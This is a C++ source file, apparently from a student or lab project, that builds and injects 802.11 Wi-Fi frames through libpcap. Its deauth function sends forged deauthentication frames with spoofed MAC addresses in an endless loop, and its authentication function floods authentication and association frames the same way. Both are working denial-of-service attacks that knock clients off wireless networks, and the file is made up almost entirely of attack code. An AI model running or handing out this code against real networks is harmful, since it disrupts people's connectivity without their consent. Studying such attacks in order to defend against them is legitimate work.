#include "attack.h"
#include <unistd.h>

void authentication(pcap_t* handle, Mac r_mac, Mac t_mac)
{
    authpkt packet;
    std::memset(packet.radiotap_hdr, 0x00, sizeof(packet.radiotap_hdr));

    // authentication
    packet.flag[0] = 0xb0;
    packet.flag[1] = 0x00;
    packet.duration = htons(0x013a);

    packet.receiver_mac = r_mac;
    packet.transmitter_mac = t_mac;
    packet.bssid = r_mac;

    packet.frag_seq = htons(0x0000);
    //packet.fixed_params = {0x00, 0x00, 0x01, 0x00, 0x00, 0x00};

    while(true){
        for (int i =0; i <3; i++){
            printf("Authentication Packet content:\n");
            for (int i = 0; i < sizeof(packet.radiotap_hdr); ++i) {
                printf("%02x ",packet.radiotap_hdr[i]);
                //std::cout << packet.radiotap_hdr[i] << " ";
            }
            std::cout << std::endl;
            printf("flag : %02x \n", packet.flag[0]);
            printf("flag : %02x \n", packet.flag[1]);
            printf("duration : %04x \n", packet.duration);
            std::cout << "receiver MAC 주소: " << static_cast<std::string>(packet.receiver_mac) << std::endl;
            std::cout << "transmitter_mac 주소: " << static_cast<std::string>(packet.transmitter_mac) << std::endl;
            std::cout << "bssid MAC 주소: " << static_cast<std::string>(packet.bssid) << std::endl;
            printf("frag_seq : %04x \n",packet.frag_seq);
            printf("fixed params : ",packet.fixed_params);
            for (int i = 0; i < sizeof(packet.fixed_params); ++i) {
                printf("%02x ",packet.fixed_params[i]);
            }
            printf("\n\n");

            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
        }

        assopkt asso_packet;

        std::memset(asso_packet.radiotap_hdr, 0x00, sizeof(packet.radiotap_hdr));

        // association
        asso_packet.flag[0] = 0xb0;
        asso_packet.flag[1] = 0x00;
        asso_packet.duration = htons(0x013a);

        asso_packet.receiver_mac = r_mac;
        asso_packet.transmitter_mac = t_mac;
        asso_packet.bssid = r_mac;

        asso_packet.frag_seq = htons(0x0000);
        //packet.fixed_params = {0x31, 0x04, 0x05, 0x00};

        printf("Packet content:\n");
        for (int i = 0; i < sizeof(asso_packet.radiotap_hdr); ++i) {
            printf("%02x ",asso_packet.radiotap_hdr[i]);
        }
        std::cout << std::endl;
        printf("flag : %02x \n", asso_packet.flag[0]);
        printf("flag : %02x \n", asso_packet.flag[1]);
        printf("duration : %04x \n", asso_packet.duration);
        std::cout << "receiver MAC 주소: " << static_cast<std::string>(asso_packet.receiver_mac) << std::endl;
        std::cout << "transmitter_mac 주소: " << static_cast<std::string>(asso_packet.transmitter_mac) << std::endl;
        std::cout << "bssid MAC 주소: " << static_cast<std::string>(asso_packet.bssid) << std::endl;
        printf("frag_seq : %04x \n",asso_packet.frag_seq);
        printf("fixed params : ",asso_packet.fixed_params);
        for (int i = 0; i < sizeof(asso_packet.fixed_params); ++i) {
            printf("%02x ",asso_packet.fixed_params[i]);
        }
        printf("\n\n");

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&asso_packet), sizeof(asso_packet));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }

    return;
}

void deauth(pcap_t* handle, Mac r_mac, Mac t_mac, Mac bssid){

    deauthpkt packet;

    std::memset(packet.radiotap_hdr, 0x00, sizeof(packet.radiotap_hdr));

    packet.flag[0] = 0xc0;
    packet.flag[1] = 0x00;
    packet.duration = htons(0x013a);

    packet.receiver_mac = r_mac;
    packet.transmitter_mac = t_mac;
    packet.bssid = bssid;

    packet.frag_seq = htons(0x0000);
    packet.fixed_params = htons(0x0007);

    int i = 0;
    while(true){

        // 디버그: 패킷 내용 출력
        printf("Packet content:\n");
        for (int i = 0; i < sizeof(packet.radiotap_hdr); ++i) {
            printf("%02x ",packet.radiotap_hdr[i]);
            //std::cout << packet.radiotap_hdr[i] << " ";
        }
        std::cout << std::endl;
        printf("flag : %02x \n", packet.flag[0]);
        printf("flag : %02x \n", packet.flag[1]);
        printf("duration : %04x \n", packet.duration);
        std::cout << "receiver MAC 주소: " << static_cast<std::string>(packet.receiver_mac) << std::endl;
        std::cout << "transmitter_mac 주소: " << static_cast<std::string>(packet.transmitter_mac) << std::endl;
        std::cout << "bssid MAC 주소: " << static_cast<std::string>(packet.bssid) << std::endl;
        printf("frag_seq : %04x \n",packet.frag_seq);
        printf("fixed params : %04x\n",packet.fixed_params);
        printf("\n");

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        printf("sended!\n");

    }

}

